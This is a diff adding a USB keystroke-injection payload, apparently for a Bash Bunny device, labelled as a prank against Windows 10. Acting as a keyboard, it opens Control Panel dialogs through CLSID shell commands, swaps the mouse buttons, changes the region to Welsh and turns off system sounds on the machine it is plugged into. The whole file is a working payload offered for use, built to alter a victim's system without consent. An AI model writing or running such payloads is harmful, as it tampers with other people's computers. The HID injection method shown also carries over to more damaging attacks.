@@ -1,0 +1,51 @@
+# Title:       	Be a pest using CLSID
+# Description:  Uses CLSID to open system dialogs to swap the left and right mouse button, change the region to Welsh and turn off system sounds. 
+# Author:       Cribbit
+# Version:      1.0
+# Category:     Pranks
+# Target:       Windows 10
+# Attackmodes:	HID	
+
+LED SETUP
+
+ATTACKMODE HID 
+
+# GET SWITCH_POSITION
+
+LED ATTACK
+
+QUACK DELAY 200
+# Swop Mouse buttons L <-> R 
+RUN WIN "shell:::{6C8EEC18-8D75-41B2-A177-8831D59D2D50}"
+QUACK DELAY 200
+QUACK SPACE
+QUACK DELAY 100
+QUACK ENTER
+QUACK DELAY 100
+# Set region to Welsh
+RUN WIN "shell:::{62D8ED13-C9D0-4CE8-A914-47DD628FB1B0}"
+QUACK DELAY 200
+# Walser (Switzerland)
+QUACK w
+QUACK DELAY 100
+# Welsh
+QUACK w
+QUACK DELAY 100
+QUACK ENTER
+QUACK DELAY 100
+# Turn off system sounds
+RUN WIN "shell:::{F2DDFC82-8F12-4CDD-B7DC-D4FE1425AA4D}"
+QUACK DELAY 200
+QUACK SHIFT TAB
+QUACK DELAY 100
+QUACK RIGHTARROW
+QUACK DELAY 100
+QUACK RIGHTARROW
+QUACK DELAY 100
+QUACK TAB
+QUACK DELAY 100
+QUACK UPARROW
+QUACK DELAY 100
+QUACK ENTER
+
+LED FINISH
